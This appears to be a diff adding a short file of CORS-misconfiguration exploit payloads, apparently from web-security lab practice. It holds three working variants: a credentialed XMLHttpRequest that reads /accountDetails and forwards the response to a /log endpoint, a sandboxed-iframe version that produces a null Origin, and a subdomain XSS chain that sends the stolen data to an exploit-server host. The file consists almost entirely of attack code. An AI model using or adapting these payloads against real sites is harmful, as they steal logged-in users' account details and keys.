@@ -1,0 +1,30 @@
+<script>
+    var req = new XMLHttpRequest();
+    req.open('get','https://127.0.0.1/accountDetails',true);
+    req.withCredentials = true;
+    req.onload = function () {
+        window.location.href='/log?key='+this.responseText;
+    };
+    
+    req.send();
+</script>
+
+
+Null origin Request
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+var req = new XMLHttpRequest();
+    req.open('get','https://127.0.0.1/accountDetails',true);
+    req.withCredentials = true;
+    req.onload = function () {
+        window.location.href='/log?key='+this.responseText;
+    };
+    
+    req.send();
+</script>"></iframe>
+
+
+Subdomain:
+<script>
+    document.location="http://subdomain.localhost.net/?XSS=<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://localhost/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-server.net/log?key='%2bthis.responseText; };%3c/script>"
+</script>
+
